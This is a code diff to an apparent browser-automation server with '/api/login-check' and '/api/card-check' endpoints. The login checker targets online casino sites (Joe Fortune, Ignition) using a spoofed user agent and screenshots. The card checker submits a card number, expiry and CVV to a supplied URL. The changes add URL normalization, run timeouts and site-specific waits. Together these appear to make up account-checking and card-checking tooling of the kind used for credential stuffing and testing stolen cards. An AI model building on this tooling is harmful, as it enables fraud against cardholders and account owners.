       userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
       ignoreHTTPSErrors: true,
       storageState,
@@ -1695,7 +1451,7 @@ app.post('/api/login-check', async (req, res) => {
     // rather than 4 blank slots.
     bail();
     try {
-      await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
+      await page.goto(normalizedLoginUrl, { waitUntil: 'domcontentloaded', timeout });
     } catch (navErr) {
       note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
       const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
@@ -1709,8 +1465,9 @@ app.post('/api/login-check', async (req, res) => {
         shotUrls,
       });
     }
-    // Joe Fortune timing applied to all sites (Ignition mirrored from Joe).
-    const initialLoadWait = 2000;
+    // Ignition takes longer to paint the login overlay + cookie banner.
+    // Wait 6000ms for Ignition, 2000ms for all other sites.
+    const initialLoadWait = site === 'ign' ? 6000 : 2000;
     await page.waitForTimeout(initialLoadWait);
     await dismissCookiePopup(page);
 
@@ -1948,6 +1705,9 @@ app.post('/api/login-check', async (req, res) => {
     } : null,
   });
   }); // runExclusive
+  } finally {
+    clearTimeout(runTimeoutHandle);
+  }
 });
 
 // ── API: Card Check ───────────────────────────────────────────────────────────
@@ -1979,12 +1739,25 @@ app.post('/api/card-check', async (req, res) => {
   if (!number || !mm || !yy || !cvv || !ppsrUrl) {
     return res.status(400).json({ error: 'Missing card fields or ppsrUrl' });
   }
+  let normalizedPpsrUrl;
+  try {
+    normalizedPpsrUrl = normalizeAutomationUrl(ppsrUrl);
+  } catch (err) {
+    return res.status(400).json({ error: `Invalid ppsrUrl: ${err.message}` });
+  }
 
-  const runHandle = startRun({ kind: 'card', last4: String(number).slice(-4), ppsrUrl });
-  await applyDomainThrottle(ppsrUrl);
+  const runHandle = startRun({ kind: 'card', last4: String(number).slice(-4), ppsrUrl: normalizedPpsrUrl });
+  const runTimeoutHandle = setTimeout(() => {
+    if (runRegistry.has(runHandle.runId)) {
+      try { runHandle.controller.abort(); } catch {}
+      logEvent('warn', 'run.timeout', { runId: runHandle.runId, kind: 'card', timeoutMs: RUN_TIMEOUT_MS });
+    }
+  }, RUN_TIMEOUT_MS);
+  await applyDomainThrottle(normalizedPpsrUrl);
 
   // Serialize against the global automation mutex — only one Chromium open
   // at a time across login + card checks.
+  try {
   await runExclusive(async () => {
   let context;
   const shotUrls = ['', '', '', ''];
@@ -2018,7 +1791,7 @@ app.post('/api/card-check', async (req, res) => {
     // so the user has visual evidence of the failure mode.
     bail();
     try {
-      await page.goto(ppsrUrl, { waitUntil: 'domcontentloaded', timeout });
+      await page.goto(normalizedPpsrUrl, { waitUntil: 'domcontentloaded', timeout });
     } catch (navErr) {
       note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
       const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
@@ -2091,6 +1864,9 @@ app.post('/api/card-check', async (req, res) => {
     shotUrls,
   });
   }); // runExclusive
+  } finally {
+    clearTimeout(runTimeoutHandle);
+  }
 });
 
 // ── API: Flow Recorder ────────────────────────────────────────────────────────
@@ -2227,6 +2003,12 @@ app.get('/api/record-flow/status', (req, res) => {
 app.post('/api/record-flow', async (req, res) => {
   const { loginUrl } = req.body;
   if (!loginUrl) return res.status(400).json({ error: 'Missing loginUrl' });
+  let normalizedLoginUrl;
+  try {
+    normalizedLoginUrl = normalizeAutomationUrl(loginUrl);
+  } catch (err) {
+    return res.status(400).json({ error: `Invalid loginUrl: ${err.message}` });
+  }
   if (flowSession && flowSession.status === 'recording') {
     return res.status(409).json({ error: 'A recording session is already active. Close the browser window first.' });
   }
@@ -2235,8 +2017,7 @@ app.post('/api/record-flow', async (req, res) => {
 
   let browser;
   try {
-    await ensureSelectorsHubExtension();
-    browser = await chromium.launch({ headless: false, args: ['--window-size=1280,800', ...extensionLaunchArgs()] });
+    browser = await chromium.launch({ headless: false, args: ['--window-size=1280,800'] });
     const context = await browser.newContext({
       viewport: { width: 1280, height: 800 },
       ignoreHTTPSErrors: true,
@@ -2249,7 +2030,7 @@ app.post('/api/record-flow', async (req, res) => {
     page.on('close', () => { userClosedBrowser = true; });
     browser.on('disconnected', () => { userClosedBrowser = true; });
 
-    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
+    await page.goto(normalizedLoginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
     await page.waitForTimeout(1500);
 
     // Inject initial overlay with Done button; no step limit
